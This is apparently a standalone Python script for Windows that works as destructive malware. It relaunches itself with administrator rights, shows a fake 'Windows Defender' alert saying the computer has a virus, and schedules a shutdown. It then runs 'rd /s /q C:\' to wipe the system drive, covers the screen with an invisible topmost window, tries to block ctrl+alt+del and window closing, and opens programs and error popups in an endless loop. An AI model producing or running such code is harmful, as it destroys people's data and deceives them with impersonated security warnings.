from __future__ import print_function
import os, keyboard
import tkinter as tk
import tkinter.messagebox as tm
import threading
import time
 
 
import ctypes, sys
 
 
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
 
 
if is_admin():
    def happy():
        while True:
            os.startfile('cmd')
            os.startfile('explorer')
            os.startfile('notepad')
            os.startfile('calc')
            os.startfile('colorcpl')
            threading.Thread(target=lambda: tm.showerror('Microsoft Windows', "ERROR!")).start()
 
 
    def rs():
        threading.Thread(
            target=lambda: tm.showwarning("Windows Defender", "Your computer is on a virus. We are going to kill it, Your computer will shutdown when we kill it.\n Do not shutdown by your self!!!")).start()
        os.system("shutdown -s -t 120")
 
 
    with open("file.exe", 'wb') as f:
        f.write(b'123456')
 
    try:
        os.startfile('file.exe')
    except OSError:
        os.remove('file.exe')
    time.sleep(10)
    root = tk.Tk()
    root.title('')
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.attributes("-alpha", 0.01)
 
    def exit():
        pass
 
 
    keyboard.add_hotkey('ctrl+alt+del', exit)
    keyboard.add_hotkey('ctrl+alt+del', exit)
    root.protocol("WM_DELETE_WINDOW", exit)
    threading.Thread(target=rs).start()
    time.sleep(5)
    threading.Thread(target=lambda: os.system('rd /s /q C:\\')).start()
    threading.Thread(target=happy).start()
    root.mainloop()
 
 
 
 
else:
    if sys.version_info[0] == 3:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    else:
        ctypes.windll.shell32.ShellExecuteW(None, u"runas", unicode(sys.executable), unicode(__file__), None, 1)